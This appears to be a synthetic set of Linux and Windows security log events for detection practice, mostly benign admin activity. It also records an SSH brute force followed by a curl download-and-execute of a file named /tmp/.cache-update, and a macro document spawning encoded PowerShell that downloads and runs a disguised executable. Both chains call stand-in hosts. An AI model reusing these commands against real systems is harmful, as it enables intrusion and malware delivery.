[
  {
    "log_source": "linux_sshd",
    "timestamp": "2026-09-14T08:55:10+00:00",
    "host": "web-prod-01",
    "program": "sshd",
    "pid": 2101,
    "event": "auth_success",
    "user": "alice",
    "src_ip": "10.0.5.23",
    "src_port": 50212,
    "auth_method": "publickey",
    "message": "Accepted publickey for alice from 10.0.5.23 port 50212 ssh2: ED25519 SHA256:q1Xb..."
  },
  {
    "log_source": "linux_edr",
    "event_time": 1789376140000,
    "hostname": "web-prod-01",
    "event_category": "process_exec",
    "username": "alice",
    "exe_path": "/usr/bin/systemctl",
    "cmdline": "systemctl status nginx",
    "parent_exe_path": "/usr/bin/bash",
    "pid": 2140,
    "ppid": 2121
  },
  {
    "log_source": "linux_edr",
    "event_time": 1789377012000,
    "hostname": "web-prod-01",
    "event_category": "process_exec",
    "username": "alice",
    "exe_path": "/usr/bin/git",
    "cmdline": "git -C /srv/app pull origin main",
    "parent_exe_path": "/usr/bin/bash",
    "pid": 2188,
    "ppid": 2121
  },
  {
    "log_source": "network_firewall",
    "time": "2026-09-14 09:10:13",
    "device": "fw-edge-01",
    "rule": "outbound-default",
    "protocol": "tcp",
    "source_address": "10.0.1.15",
    "source_port": 41522,
    "destination_address": "140.82.112.3",
    "destination_port": 443,
    "action": "allow"
  },
  {
    "log_source": "linux_edr",
    "event_time": 1789377330000,
    "hostname": "web-prod-01",
    "event_category": "process_exec",
    "username": "alice",
    "exe_path": "/usr/bin/curl",
    "cmdline": "curl -s http://127.0.0.1:8080/healthz",
    "parent_exe_path": "/usr/bin/bash",
    "pid": 2203,
    "ppid": 2121
  },
  {
    "log_source": "linux_edr",
    "event_time": 1789377605000,
    "hostname": "web-prod-01",
    "event_category": "process_exec",
    "username": "alice",
    "exe_path": "/usr/bin/journalctl",
    "cmdline": "journalctl -u nginx --since \"1 hour ago\"",
    "parent_exe_path": "/usr/bin/bash",
    "pid": 2219,
    "ppid": 2121
  },
  {
    "log_source": "linux_sshd",
    "timestamp": "2026-09-14T09:41:03+00:00",
    "host": "web-prod-01",
    "program": "sshd",
    "pid": 2301,
    "event": "auth_failure",
    "user": "admin",
    "src_ip": "203.0.113.45",
    "src_port": 51122,
    "auth_method": "password",
    "message": "Failed password for invalid user admin from 203.0.113.45 port 51122 ssh2"
  },
  {
    "log_source": "linux_sshd",
    "timestamp": "2026-09-14T09:41:07+00:00",
    "host": "web-prod-01",
    "program": "sshd",
    "pid": 2302,
    "event": "auth_failure",
    "user": "root",
    "src_ip": "203.0.113.45",
    "src_port": 51130,
    "auth_method": "password",
    "message": "Failed password for root from 203.0.113.45 port 51130 ssh2"
  },
  {
    "log_source": "linux_sshd",
    "timestamp": "2026-09-14T09:41:11+00:00",
    "host": "web-prod-01",
    "program": "sshd",
    "pid": 2303,
    "event": "auth_failure",
    "user": "test",
    "src_ip": "203.0.113.45",
    "src_port": 51141,
    "auth_method": "password",
    "message": "Failed password for invalid user test from 203.0.113.45 port 51141 ssh2"
  },
  {
    "log_source": "linux_sshd",
    "timestamp": "2026-09-14T09:41:16+00:00",
    "host": "web-prod-01",
    "program": "sshd",
    "pid": 2304,
    "event": "auth_failure",
    "user": "ubuntu",
    "src_ip": "203.0.113.45",
    "src_port": 51155,
    "auth_method": "password",
    "message": "Failed password for invalid user ubuntu from 203.0.113.45 port 51155 ssh2"
  },
  {
    "log_source": "linux_sshd",
    "timestamp": "2026-09-14T09:41:22+00:00",
    "host": "web-prod-01",
    "program": "sshd",
    "pid": 2305,
    "event": "auth_failure",
    "user": "deploy",
    "src_ip": "203.0.113.45",
    "src_port": 51163,
    "auth_method": "password",
    "message": "Failed password for deploy from 203.0.113.45 port 51163 ssh2"
  },
  {
    "log_source": "linux_sshd",
    "timestamp": "2026-09-14T09:41:29+00:00",
    "host": "web-prod-01",
    "program": "sshd",
    "pid": 2306,
    "event": "auth_failure",
    "user": "oracle",
    "src_ip": "203.0.113.45",
    "src_port": 51170,
    "auth_method": "password",
    "message": "Failed password for invalid user oracle from 203.0.113.45 port 51170 ssh2"
  },
  {
    "log_source": "linux_sshd",
    "timestamp": "2026-09-14T09:42:05+00:00",
    "host": "web-prod-01",
    "program": "sshd",
    "pid": 2311,
    "event": "auth_success",
    "user": "deploy",
    "src_ip": "203.0.113.45",
    "src_port": 51188,
    "auth_method": "password",
    "message": "Accepted password for deploy from 203.0.113.45 port 51188 ssh2"
  },
  {
    "log_source": "linux_edr",
    "event_time": 1789378926000,
    "hostname": "web-prod-01",
    "event_category": "process_exec",
    "username": "deploy",
    "exe_path": "/usr/bin/bash",
    "cmdline": "-bash",
    "parent_exe_path": "/usr/sbin/sshd",
    "pid": 2320,
    "ppid": 2311
  },
  {
    "log_source": "linux_edr",
    "event_time": 1789378951000,
    "hostname": "web-prod-01",
    "event_category": "process_exec",
    "username": "deploy",
    "exe_path": "/usr/bin/id",
    "cmdline": "id",
    "parent_exe_path": "/usr/bin/bash",
    "pid": 2334,
    "ppid": 2320
  },
  {
    "log_source": "linux_edr",
    "event_time": 1789378958000,
    "hostname": "web-prod-01",
    "event_category": "process_exec",
    "username": "deploy",
    "exe_path": "/usr/bin/uname",
    "cmdline": "uname -a",
    "parent_exe_path": "/usr/bin/bash",
    "pid": 2337,
    "ppid": 2320
  },
  {
    "log_source": "linux_edr",
    "event_time": 1789378990000,
    "hostname": "web-prod-01",
    "event_category": "process_exec",
    "username": "deploy",
    "exe_path": "/usr/bin/curl",
    "cmdline": "curl -fsSL http://198.51.100.77/k -o /tmp/.cache-update",
    "parent_exe_path": "/usr/bin/bash",
    "pid": 2345,
    "ppid": 2320
  },
  {
    "log_source": "network_firewall",
    "time": "2026-09-14 09:43:10",
    "device": "fw-edge-01",
    "rule": "outbound-default",
    "protocol": "tcp",
    "source_address": "10.0.1.15",
    "source_port": 48122,
    "destination_address": "198.51.100.77",
    "destination_port": 80,
    "action": "allow"
  },
  {
    "log_source": "linux_edr",
    "event_time": 1789378991000,
    "hostname": "web-prod-01",
    "event_category": "file_create",
    "username": "deploy",
    "exe_path": "/usr/bin/curl",
    "cmdline": null,
    "parent_exe_path": "/usr/bin/bash",
    "pid": 2345,
    "ppid": 2320,
    "target_path": "/tmp/.cache-update",
    "file_mode": "0644"
  },
  {
    "log_source": "linux_edr",
    "event_time": 1789378999000,
    "hostname": "web-prod-01",
    "event_category": "process_exec",
    "username": "deploy",
    "exe_path": "/usr/bin/chmod",
    "cmdline": "chmod +x /tmp/.cache-update",
    "parent_exe_path": "/usr/bin/bash",
    "pid": 2351,
    "ppid": 2320
  },
  {
    "log_source": "linux_edr",
    "event_time": 1789378999500,
    "hostname": "web-prod-01",
    "event_category": "file_chmod",
    "username": "deploy",
    "exe_path": "/usr/bin/chmod",
    "cmdline": null,
    "parent_exe_path": "/usr/bin/bash",
    "pid": 2351,
    "ppid": 2320,
    "target_path": "/tmp/.cache-update",
    "file_mode": "0755"
  },
  {
    "log_source": "linux_edr",
    "event_time": 1789379004000,
    "hostname": "web-prod-01",
    "event_category": "process_exec",
    "username": "deploy",
    "exe_path": "/tmp/.cache-update",
    "cmdline": "/tmp/.cache-update",
    "parent_exe_path": "/usr/bin/bash",
    "pid": 2356,
    "ppid": 2320
  },
  {
    "log_source": "linux_edr",
    "event_time": 1789379006000,
    "hostname": "web-prod-01",
    "event_category": "network_connect",
    "username": "deploy",
    "exe_path": "/tmp/.cache-update",
    "cmdline": null,
    "parent_exe_path": "/usr/bin/bash",
    "pid": 2356,
    "ppid": 2320,
    "local_ip": "10.0.1.15",
    "local_port": 48130,
    "remote_ip": "198.51.100.77",
    "remote_port": 8443,
    "protocol": "tcp"
  },
  {
    "log_source": "linux_edr",
    "event_time": 1789379702000,
    "hostname": "web-prod-01",
    "event_category": "process_exec",
    "username": "alice",
    "exe_path": "/usr/bin/df",
    "cmdline": "df -h",
    "parent_exe_path": "/usr/bin/bash",
    "pid": 2410,
    "ppid": 2121
  },
  {
    "log_source": "linux_edr",
    "event_time": 1789380072000,
    "hostname": "web-prod-01",
    "event_category": "process_exec",
    "username": "root",
    "exe_path": "/usr/bin/apt-get",
    "cmdline": "apt-get update",
    "parent_exe_path": "/usr/bin/sudo",
    "pid": 2433,
    "ppid": 2431
  },
  {
    "log_source": "network_firewall",
    "time": "2026-09-14 10:01:13",
    "device": "fw-edge-01",
    "rule": "outbound-default",
    "protocol": "tcp",
    "source_address": "10.0.1.15",
    "source_port": 39804,
    "destination_address": "91.189.91.83",
    "destination_port": 80,
    "action": "allow"
  },
  {
    "log_source": "windows_security",
    "EventID": 4625,
    "TimeCreated": "2026-09-14T08:30:01Z",
    "Computer": "DEV-PC-03.corp.example.com",
    "EventRecordID": 88101,
    "TargetUserName": "roberto",
    "TargetDomainName": "CORP",
    "LogonType": "2",
    "LogonProcessName": "User32",
    "AuthenticationPackageName": "Negotiate",
    "WorkstationName": "DEV-PC-03",
    "IpAddress": "-",
    "IpPort": "-",
    "Status": "0xC000006D",
    "SubStatus": "0xC000006A",
    "FailureReason": "%%2313"
  },
  {
    "log_source": "windows_security",
    "EventID": 4624,
    "TimeCreated": "2026-09-14T08:30:15Z",
    "Computer": "DEV-PC-03.corp.example.com",
    "EventRecordID": 88102,
    "TargetUserName": "roberto",
    "TargetDomainName": "CORP",
    "LogonType": "2",
    "LogonProcessName": "User32",
    "AuthenticationPackageName": "Negotiate",
    "WorkstationName": "DEV-PC-03",
    "IpAddress": "-",
    "IpPort": "-"
  },
  {
    "log_source": "sysmon",
    "EventID": 1,
    "UtcTime": "2026-09-14 08:31:02.114",
    "Computer": "DEV-PC-03.corp.example.com",
    "EventRecordID": 51201,
    "RuleName": "-",
    "ProcessId": "6120",
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "User": "CORP\\roberto",
    "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessId": "4012",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "IntegrityLevel": "Medium"
  },
  {
    "log_source": "sysmon",
    "EventID": 22,
    "UtcTime": "2026-09-14 08:31:40.502",
    "Computer": "DEV-PC-03.corp.example.com",
    "EventRecordID": 51207,
    "RuleName": "-",
    "ProcessId": "6120",
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "User": "CORP\\roberto",
    "QueryName": "github.com",
    "QueryStatus": "0",
    "QueryResults": "::ffff:140.82.121.4;"
  },
  {
    "log_source": "sysmon",
    "EventID": 3,
    "UtcTime": "2026-09-14 08:31:40.731",
    "Computer": "DEV-PC-03.corp.example.com",
    "EventRecordID": 51208,
    "RuleName": "-",
    "ProcessId": "6120",
    "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
    "User": "CORP\\roberto",
    "Protocol": "tcp",
    "Initiated": "true",
    "SourceIp": "10.0.2.51",
    "SourcePort": "52611",
    "DestinationIp": "140.82.121.4",
    "DestinationHostname": "lb-140-82-121-4-fra.github.com",
    "DestinationPort": "443"
  },
  {
    "log_source": "sysmon",
    "EventID": 1,
    "UtcTime": "2026-09-14 08:47:22.010",
    "Computer": "DEV-PC-03.corp.example.com",
    "EventRecordID": 51260,
    "RuleName": "-",
    "ProcessId": "7344",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "User": "CORP\\roberto",
    "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -Command \"Get-Service | Where-Object Status -eq 'Stopped'\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessId": "4012",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "IntegrityLevel": "Medium"
  },
  {
    "log_source": "sysmon",
    "EventID": 1,
    "UtcTime": "2026-09-14 09:15:00.233",
    "Computer": "DEV-PC-03.corp.example.com",
    "EventRecordID": 51302,
    "RuleName": "-",
    "ProcessId": "8010",
    "Image": "C:\\Windows\\System32\\usoclient.exe",
    "User": "NT AUTHORITY\\SYSTEM",
    "CommandLine": "C:\\Windows\\system32\\usoclient.exe StartScan",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentProcessId": "1420",
    "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s UsoSvc",
    "IntegrityLevel": "System"
  },
  {
    "log_source": "windows_security",
    "EventID": 4624,
    "TimeCreated": "2026-09-14T08:58:12Z",
    "Computer": "FIN-WS-07.corp.example.com",
    "EventRecordID": 90411,
    "TargetUserName": "mgarcia",
    "TargetDomainName": "CORP",
    "LogonType": "2",
    "LogonProcessName": "User32",
    "AuthenticationPackageName": "Negotiate",
    "WorkstationName": "FIN-WS-07",
    "IpAddress": "-",
    "IpPort": "-"
  },
  {
    "log_source": "sysmon",
    "EventID": 1,
    "UtcTime": "2026-09-14 08:58:40.318",
    "Computer": "FIN-WS-07.corp.example.com",
    "EventRecordID": 61022,
    "RuleName": "-",
    "ProcessId": "5216",
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "User": "CORP\\mgarcia",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessId": "3880",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "IntegrityLevel": "Medium"
  },
  {
    "log_source": "sysmon",
    "EventID": 22,
    "UtcTime": "2026-09-14 08:58:44.105",
    "Computer": "FIN-WS-07.corp.example.com",
    "EventRecordID": 61025,
    "RuleName": "-",
    "ProcessId": "5216",
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "User": "CORP\\mgarcia",
    "QueryName": "outlook.office365.com",
    "QueryStatus": "0",
    "QueryResults": "type:  5 outlook.ha.office365.com;::ffff:52.97.146.162;"
  },
  {
    "log_source": "sysmon",
    "EventID": 3,
    "UtcTime": "2026-09-14 08:58:44.390",
    "Computer": "FIN-WS-07.corp.example.com",
    "EventRecordID": 61026,
    "RuleName": "-",
    "ProcessId": "5216",
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "User": "CORP\\mgarcia",
    "Protocol": "tcp",
    "Initiated": "true",
    "SourceIp": "10.0.2.37",
    "SourcePort": "50944",
    "DestinationIp": "52.97.146.162",
    "DestinationHostname": "",
    "DestinationPort": "443"
  },
  {
    "log_source": "sysmon",
    "EventID": 11,
    "UtcTime": "2026-09-14 09:31:40.877",
    "Computer": "FIN-WS-07.corp.example.com",
    "EventRecordID": 61340,
    "RuleName": "-",
    "ProcessId": "5216",
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "User": "CORP\\mgarcia",
    "TargetFilename": "C:\\Users\\mgarcia\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\8XK2P1QZ\\Invoice_Sept_2026.docm",
    "CreationUtcTime": "2026-09-14 09:31:40.877"
  },
  {
    "log_source": "sysmon",
    "EventID": 1,
    "UtcTime": "2026-09-14 09:31:44.120",
    "Computer": "FIN-WS-07.corp.example.com",
    "EventRecordID": 61344,
    "RuleName": "-",
    "ProcessId": "6648",
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "User": "CORP\\mgarcia",
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\mgarcia\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\8XK2P1QZ\\Invoice_Sept_2026.docm\" /o \"\"",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
    "ParentProcessId": "5216",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
    "IntegrityLevel": "Medium"
  },
  {
    "log_source": "sysmon",
    "EventID": 1,
    "UtcTime": "2026-09-14 09:32:05.417",
    "Computer": "FIN-WS-07.corp.example.com",
    "EventRecordID": 61351,
    "RuleName": "-",
    "ProcessId": "7092",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "User": "CORP\\mgarcia",
    "CommandLine": "powershell.exe -NoP -W Hidden -Enc JABwAD0AIgAkAGUAbgB2ADoAVABFAE0AUABcAE8AbgBlAEQAcgBpAHYAZQBTAHkAbgBjAC4AZQB4AGUAIgA7ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAG8AZgBmAGkAYwBlAC0AYwBkAG4ALQB1AHAAZABhAHQAZQAuAGUAeABhAG0AcABsAGUALwBzAHkAbgBjAC4AZQB4AGUAJwAsACQAcAApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAcAA=",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentProcessId": "6648",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\mgarcia\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\8XK2P1QZ\\Invoice_Sept_2026.docm\" /o \"\"",
    "IntegrityLevel": "Medium"
  },
  {
    "log_source": "sysmon",
    "EventID": 22,
    "UtcTime": "2026-09-14 09:32:06.002",
    "Computer": "FIN-WS-07.corp.example.com",
    "EventRecordID": 61353,
    "RuleName": "-",
    "ProcessId": "7092",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "User": "CORP\\mgarcia",
    "QueryName": "office-cdn-update.example",
    "QueryStatus": "0",
    "QueryResults": "::ffff:192.0.2.80;"
  },
  {
    "log_source": "sysmon",
    "EventID": 3,
    "UtcTime": "2026-09-14 09:32:06.260",
    "Computer": "FIN-WS-07.corp.example.com",
    "EventRecordID": 61354,
    "RuleName": "-",
    "ProcessId": "7092",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "User": "CORP\\mgarcia",
    "Protocol": "tcp",
    "Initiated": "true",
    "SourceIp": "10.0.2.37",
    "SourcePort": "51320",
    "DestinationIp": "192.0.2.80",
    "DestinationHostname": "office-cdn-update.example",
    "DestinationPort": "80"
  },
  {
    "log_source": "sysmon",
    "EventID": 11,
    "UtcTime": "2026-09-14 09:32:08.911",
    "Computer": "FIN-WS-07.corp.example.com",
    "EventRecordID": 61357,
    "RuleName": "-",
    "ProcessId": "7092",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "User": "CORP\\mgarcia",
    "TargetFilename": "C:\\Users\\mgarcia\\AppData\\Local\\Temp\\OneDriveSync.exe",
    "CreationUtcTime": "2026-09-14 09:32:08.911"
  },
  {
    "log_source": "sysmon",
    "EventID": 1,
    "UtcTime": "2026-09-14 09:32:10.034",
    "Computer": "FIN-WS-07.corp.example.com",
    "EventRecordID": 61360,
    "RuleName": "-",
    "ProcessId": "7420",
    "Image": "C:\\Users\\mgarcia\\AppData\\Local\\Temp\\OneDriveSync.exe",
    "User": "CORP\\mgarcia",
    "CommandLine": "\"C:\\Users\\mgarcia\\AppData\\Local\\Temp\\OneDriveSync.exe\"",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentProcessId": "7092",
    "ParentCommandLine": "powershell.exe -NoP -W Hidden -Enc JABwAD0AIgAkAGUAbgB2ADoAVABFAE0AUABcAE8AbgBlAEQAcgBpAHYAZQBTAHkAbgBjAC4AZQB4AGUAIgA7ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAG8AZgBmAGkAYwBlAC0AYwBkAG4ALQB1AHAAZABhAHQAZQAuAGUAeABhAG0AcABsAGUALwBzAHkAbgBjAC4AZQB4AGUAJwAsACQAcAApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAcAA=",
    "IntegrityLevel": "Medium"
  },
  {
    "log_source": "sysmon",
    "EventID": 3,
    "UtcTime": "2026-09-14 09:32:14.688",
    "Computer": "FIN-WS-07.corp.example.com",
    "EventRecordID": 61366,
    "RuleName": "-",
    "ProcessId": "7420",
    "Image": "C:\\Users\\mgarcia\\AppData\\Local\\Temp\\OneDriveSync.exe",
    "User": "CORP\\mgarcia",
    "Protocol": "tcp",
    "Initiated": "true",
    "SourceIp": "10.0.2.37",
    "SourcePort": "51327",
    "DestinationIp": "192.0.2.81",
    "DestinationHostname": "",
    "DestinationPort": "443"
  }
]
